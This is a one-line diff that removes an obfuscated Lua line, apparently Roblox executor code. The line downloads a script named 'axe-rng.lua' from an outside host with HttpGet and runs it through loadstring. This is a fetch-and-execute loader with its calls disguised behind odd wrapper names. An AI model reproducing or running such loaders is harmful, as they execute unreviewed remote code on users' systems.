@@ -1,1 +1,0 @@
-hpzzmoteCALL((hpzzmoteCALL((loadstring),hpzzmoteNAMECALL(game,"HttpGet","https://ashlabs.me/api/game?name=axe-rng.lua",true))));
